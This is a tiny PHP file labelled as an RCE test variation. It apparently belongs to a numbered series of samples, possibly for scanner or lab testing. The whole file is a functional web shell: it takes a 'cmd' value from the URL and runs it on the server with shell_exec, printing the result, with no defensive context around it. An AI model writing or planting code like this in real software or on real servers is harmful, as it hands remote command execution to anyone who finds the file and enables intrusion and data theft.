<?php
// RCE test variation #120
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>